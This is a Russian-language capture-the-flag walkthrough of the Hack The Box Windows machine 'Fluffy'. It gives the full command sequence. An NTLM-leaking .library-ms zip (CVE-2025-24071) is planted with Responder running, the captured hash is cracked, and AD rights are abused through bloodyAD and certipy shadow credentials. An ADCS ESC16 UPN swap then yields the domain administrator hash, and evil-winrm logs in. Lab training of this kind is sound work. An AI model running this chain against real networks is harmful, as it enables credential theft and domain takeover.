<div class="htb-box-info easy">
  <div class="box-header">
    <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ef8fc92ac7cccd8afa4412241432f064.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Windows</td></tr>
        <tr><td>Difficulty:</td><td>Easy</td></tr>
        <tr><td>Release:</td><td>24 May 2025</td></tr>
      </table>
    </div>
  </div>
</div>

> As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

Начинаем со скана открытых портов:
```bash
nmap -p- --min-rate 1000 -v 10.129.232.88

OUTPUT:
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49709/tcp open  unknown
49722/tcp open  unknown
```

Также нужно найти больше информации о домене, о разнице во времени...
```bash
nmap -sC -sV -vv 10.129.232.88

OUTPUT:
...
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-28T15:01:14+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
...
```

Добавим в `/etc/hosts` следующую страницу:
```
10.129.232.88   DC01.fluffy.htb fluffy.htb DC01
```

Нам дали коробку с уже найденными кредами. Поэтому проверяем доступные шары для пользователя `j.fleischman`:
```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```
![[Pasted image 20260428130552.png]]

Также будет полезным найти всех пользователей:
```bash
netexec smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
```
![[Pasted image 20260428131754.png]]

дальше я решил запустить `rusthound`. Сборшик данных для `bloodhound`.
```bash
rusthound-ce -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990! -c All -z
```

Пометим нашего пользователя как `owned`:
![[Pasted image 20260428162402.png]]
`bloodhoud` не смогу найти путей для движения... Продолжим поиски...

Дальше я решил скачать `IT` шару.
```bash
smbclient '//10.129.18.235/IT' -U 'j.fleischman%J0elTHEM4n1990!'
> mget *
```

Получаем следущие файлы. Тут самое интересное pdf файл...
![[Pasted image 20260428162928.png]]

Тут говориться, что нужно обновить систему, тк были найденны следующие уязвимости. Я выбрал самыую критическую для проверки на эксплуатируемость...
![[Pasted image 20260428162942.png]]

Уязвимость состоит в том, что виндовс эксплорер криво обрабатывает архивы с `.library-ms` файлом внутри. Когда архив будет разархивирован... это стриггерит ntlm логин атемт на наш сервер... почитать больше можно [тут](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

я нашел [пайтон скрипт](https://github.com/Marcejr117/CVE-2025-24071_PoC) для создания вредоносного файла:
![[Pasted image 20260429104048.png]]
Он создает `exploit.zip`, содержащий тот самый `.library-ms` файл...

Загружаем эксплойт:
![[Pasted image 20260429104335.png]]

Ждем когда архив будет раскрыт...
![[Pasted image 20260429104351.png]]

Но до этого нужно включить `responder`, тк атака состоит в том, что мы заставляем жертву  авторизоваться на нашем хосте...
![[Pasted image 20260429104409.png]]

Получаем пользователя: `FLUFFY\p.agila`

Запускаем `hashcat`. Тип хэша он определил как:
```
5600 | NetNTLMv2 | Network Protocol
```

Через минуту получаем пароль:
```
P.AGILA::FLUFFY:e1e1a0300dbf4f83:14c0ad38e0dbf89997ab104e8c904fdb:010100000000000000ea2ee9c4d7dc019dd2e9f8fa0c4e950000000002000800380054005300410001001e00570049004e002d00330054003200590057004200410032004e005900330004003400570049004e002d00330054003200590057004200410032004e00590033002e0038005400530041002e004c004f00430041004c000300140038005400530041002e004c004f00430041004c000500140038005400530041002e004c004f00430041004c000700080000ea2ee9c4d7dc0106000400020000000800300030000000000000000100000000200000661bb596252b9d0d83381b25a49e3e60d3c80a486d26ef9d501a60a2d5d59d010a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00340032000000000000000000:prometheusx-303
```

Получаем юзера p.agila с паролем prometheusx-303.

Запустим `rusthound`. Только теперь как p.agila.
```bash
rusthound-ce -d fluffy.htb -u p.agila -p prometheusx-303 -c All -z
```

Пометим пользователя как `owned`
![[Pasted image 20260429105657.png]]

Потыкав в bloodhound-е, я нашел вот такой маршрут до сервисных пользователей:
![[Pasted image 20260429105948.png]]

Для начала нам нужно добавиться в группу SERVICE ACCOUNTS над которой мы имеем `GenericAll` право... Это можно сделать используя множество различных инструментов. Я сделал это с помощью `bloodyAD`:

```bash
python3 bloodyAD.py -d fluffy.htb -u p.agila -p 'prometheusx-303' --host 10.129.232.88 add groupMember 'SERVICE ACCOUNTS' 'p.agila'
```

Теперь p.agila должен иметь `GenericWrite` над winrm_svc. Мы можем с этим правом атаковать кербероз ( вытащить хэш и попробовать сломать его ( я пробовал это сделать c вордлистом  `rockyou.txt`. у меня не вышло...)), поменять пароль жертвы или добавить shadow креды... Я решил выбрать добавление shadow кред...

Для работы с керберосом нужно синхронизировать время систем:
```bash
sudo timedatectl set-ntp off
sudo ntpdate 10.129.232.88
```

Дальше используя инструмент `certipy-ad`:
```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -debug
```

Получаем ntlm хэш.
```
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

С этим хэшем можно подключиться к юзеру winrm_svc по протоколу winrm... 
```bash
evil-winrm -i DC01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

Получаем первый флаг:
![[Pasted image 20260505185401.png]]

# root
Также как и для winrm_svc, достаем хэш для ca_svc. 
![[Pasted image 20260505204630.png]]
Этот пользователь имеет доступ к сертификатам, поэтому я выбрал его...

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc -debug

[+] Data written to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Я использую certipy-ad для поиска уязвимых сертификатов:
```bash
certipy-ad find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable
```

Получаем файлы:
```
[*] Saving text output to '20260505203051_Certipy.txt'
[*] Wrote text output to '20260505203051_Certipy.txt'
[*] Saving JSON output to '20260505203051_Certipy.json'
[*] Wrote JSON output to '20260505203051_Certipy.json'
```

### ESC16
Видим, что есть уязвимость esc16...
![[Pasted image 20260505203144.png]]
[see info about esc16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

По сути эта уязвимость появляется из-за того, что CA настроен так, что он вынужденно отключает `szOID_NTDS_CA_SECURITY_EXT` для созданных сертификатов. Эта настройка нужно для правильной работы выдачи сертификатов... без этого я могу изменить юзера так, чтобы он могу получить любой сертификат...

Я имею двух пользователей: winrm_svc и ca_svc. Между ними есть `GenericWrite`... Я буду с аккаунта winrm_svc изменять ca_svc, опираясь на [see info about esc16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)...

Для начала ca_svc имеет слудеющие аттрибуты:
```bash
certipy-ad account -u winrm_svc -hashes :33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.129.232.88 -user ca_svc read

OUTPUT:
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2026-05-05T15:28:26+00:00
```
UPN - `ca_svc@fluffy.htb`

Обновим этот UPN на администраторский:
```bash
certipy-ad account -u winrm_svc -hashes :33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.129.232.88 -upn administrator -user ca_svc update

OUTPUT:
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Теперь нужно запросить сертификат:
```bash
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target DC01.fluffy.htb -ca fluffy-DC01-CA -template User -debug

OUTPUT:
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```


Теперь тк мы получили сертификат, нужно убраться за собой. Поменяем UPN обратно:
```bash
 certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update

OUTPUT:
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Имея сертификат, я использую `certipy-ad auth` для получения NTLM хэша:
```bash
certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb

OUTPUT:
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

подключаемся по протоколу `winrm`:
```bash
evil-winrm -i DC01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

получаем флаг:
![[Pasted image 20260505191117.png]]

